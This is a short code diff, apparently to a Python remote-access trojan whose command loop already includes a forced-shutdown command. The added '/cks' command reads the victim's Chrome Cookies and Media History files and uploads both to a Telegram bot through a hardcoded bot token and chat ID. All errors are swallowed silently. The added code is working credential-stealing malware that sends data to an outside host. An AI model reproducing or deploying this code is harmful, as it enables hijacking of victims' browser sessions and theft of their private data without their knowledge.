@@ -95,5 +95,19 @@ while True:
 
 		elif a == "/poff":
 			os.system('shutdown /r /f /t 0')
+		
+		elif a == "/cks":
+			login = os.getlogin()
+			cookie = "C:\\Users\\"+login+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
+			MediaHistory = "C:\\Users\\"+login+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media History"
+			f = open(cookie, 'rb')
+			files = {'document': f}
+			requests.post("https://api.telegram.org/bot1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g/sendDocument?chat_id=330710135", files=files)
+			f.close()
+			f = open(MediaHistory, 'rb')
+			files = {'document': f}
+			requests.post("https://api.telegram.org/bot1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g/sendDocument?chat_id=330710135", files=files)
+			f.close()
+
 	except:
 		pass
